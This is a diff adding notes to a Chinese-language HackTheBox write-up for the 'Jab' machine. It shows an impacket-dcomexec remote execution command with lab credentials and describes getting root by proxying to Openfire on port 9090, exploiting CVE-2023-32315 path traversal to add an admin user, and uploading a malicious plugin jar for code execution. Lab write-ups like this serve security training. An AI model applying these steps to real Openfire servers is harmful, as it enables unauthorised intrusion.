@@ -559,7 +559,15 @@ impacket-dcomexec -object MMC20 jab.htb/svc_openfire:"$password"@10.10.11.4 'pow
 ![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240413003210.png)
 
 #### root
-通过内网穿透访问9090页面,
+通过内网穿透访问9090页面,proxifier设置socks5代理
+
+使用svc那个用户登录,搜索openfire相关漏洞得到`CVE-2023-32315`
+
+发现存在目录穿梭可以新建一个administrator用户,再上传一个jar包插件,实现rce(好像svc这个用户就可以直接传插件,svc也是admin)
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240413014239.png)
+
+![image.png](https://gitee.com/leiye87/typora_picture/raw/master/20240413014411.png)
+
 
 ### Hospital
 #win
